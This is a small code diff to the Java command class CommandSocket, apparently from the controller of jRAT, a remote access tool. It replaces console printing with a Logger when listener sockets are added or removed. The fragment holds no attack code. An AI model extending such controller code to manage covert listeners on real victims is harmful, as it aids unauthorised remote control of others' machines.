@@ -1,5 +1,6 @@
 package io.jrat.controller.commands;
 
+import io.jrat.common.Logger;
 import io.jrat.controller.Main;
 import io.jrat.controller.net.PortListener;
 import io.jrat.controller.net.ServerListener;
@@ -58,15 +59,15 @@ public class CommandSocket extends AbstractCommand {
 			
 			connection.start();
 			
-			System.out.println("Socket " + name + " added");
+			Logger.log("Socket " + name + " added");
 		} else if (action.equalsIgnoreCase("remove")) {
 			PortListener con = PortListener.getListener(name);
 			con.getServer().close();
 			PortListener.listeners.remove(con);
 			
-			System.out.println("Socket closed");
+			Logger.log("Socket closed");
 		} else {
-			System.err.println("Invalid option " + action);
+			Logger.err("Invalid option " + action);
 		}
 	}
 
